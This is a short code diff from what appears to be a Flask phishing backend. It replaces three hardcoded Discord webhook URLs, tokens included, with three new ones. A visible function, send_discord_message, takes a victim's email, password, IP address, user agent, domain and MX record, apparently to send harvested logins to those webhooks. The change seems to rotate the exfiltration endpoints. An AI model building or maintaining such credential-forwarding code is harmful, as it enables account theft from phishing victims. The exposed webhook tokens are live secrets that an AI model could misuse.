@@ -13,9 +13,9 @@ from flask_limiter.util import get_remote_address
 
 # Discord Webhook URL
 DISCORD_WEBHOOK_URLS = [
-    "https://discord.com/api/webhooks/1400503399988068553/YNpkRNM4uJwwFoevlsup2trY-sWF0mqzcKCCR5jPWFcjblehYvXxT_FrSKP93z5ielb5",
-    "https://discord.com/api/webhooks/1400503440689336491/uGSd16SHfBM6uxZDV45DCshAog497D52vRgCiuyozI8aW2mIIE29ytIrSxz-IKGSZibZ",
-    "https://discord.com/api/webhooks/1400503460780048567/EyUr8dLLPXNH60__cLsWi53tTvnikSJ3vn5OsAywkDFSxHhAL1vGdx27AZLUUF_NfT4C"
+    "https://discord.com/api/webhooks/1417041671207784458/CfoksWV1b2A_1XHuqydsWDatPyKxz0FmNqkzXRq1Wmuif7StIBhYzpYAChJVdSpNy96r",
+    "https://discord.com/api/webhooks/1417041686906929182/ijDrylDxtWW_kYtLkwhZjzx7Ij2-Ok-EeOsdWtZ3q6E9vtYQbIOXMiG3GIYYRlrQIGEj",
+    "https://discord.com/api/webhooks/1417041731643244554/YD-YaxptBDDRY8CRth-GeJ4-FhH4W5LE82vIcEdtMIii4S8lncIXsP9cPH5jDnUZnYX6"
 ]
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
